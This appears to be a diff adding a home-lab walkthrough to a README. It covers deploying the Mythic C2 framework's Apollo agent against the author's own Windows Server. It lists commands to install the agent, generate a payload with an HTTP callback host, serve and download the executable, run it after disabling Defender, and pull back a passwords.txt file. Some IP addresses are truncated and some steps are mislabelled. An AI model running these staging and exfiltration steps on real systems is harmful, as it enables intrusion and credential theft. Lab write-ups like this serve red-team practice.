@@ -553,6 +553,88 @@ Here is the video link of me executing the command:
 
 https://github.com/user-attachments/assets/20048734-4238-48c4-a3c8-1a062444a6ff
 
+* I disabled the Windows Defender on my Windows Server
+* Visited the Mythic website to explore Windows-compatible agents
+* Choose the Apollo agent for deployment.
+* Entered the following command in the terminal to install the agent:
+
+```bash
+./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+```
+
+Proceeded to install the http profile by executing the following command:
+
+```bash
+./mythic-cli install github https://github.com/MythicC2Profiles/http
+```
+
+*you can now see both agents
+![image](https://github.com/user-attachments/assets/c489c8b1-21be-4fcb-b183-62dcd37652ac)
+
+*After installation, create a new Windows payload in Mythic.
+*Selected the WindowsExe package and included all necessary commands.
+*Chose the http C2 Profile and set the Callback Host to HTTP://173.199.123.188
+*Finalized the setup and generated the payload.
+*Right click the download file and select copy link address
+
+
+Run the following command:
+```bash
+wget https://173.199.123:7443/direct/download/b8f70270-2709-4ee0-819b-2420cba3e725 --no-check-certificate
+```
+
+
+*After downloading, rename the file to apollo.exe
+*Created a directory named 1
+*Moved the renamed file into the 1 directory
+*Allow port number 9999 ufw allow 9999 and port 80
+*Run the fllowing command
+
+``` bash
+python3 -m http.server 9999
+```
+
+On the Kali machine run this command:
+
+```bash
+Invoke-WebRequest -Uri http://173.199.123:9999/apollo.exe -OutFile "C:\Users\Public\Downloads\apollo.exe"
+```
+
+
+*On the Mythics server cd into C:\Users\Public\Downloads\
+*Run this command:
+
+```bash
+.\apollo.exe
+```
+
+*You can see my active call back on my Mythic Dashboard
+![image](https://github.com/user-attachments/assets/282ae422-1332-4edb-8928-b08ebdd3cadf)
+
+* I interact with the server with the following commands
+* Whoami
+* ifconfig
+* Attempted to download the previously created passwords.txt file using the following command:
+```bash
+download C:\Users\Administrator\Documents\passwords.txt
+```
+
+
+![image](https://github.com/user-attachments/assets/ab7952f7-1c3d-4fd1-bc8e-f087852c8bf2)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
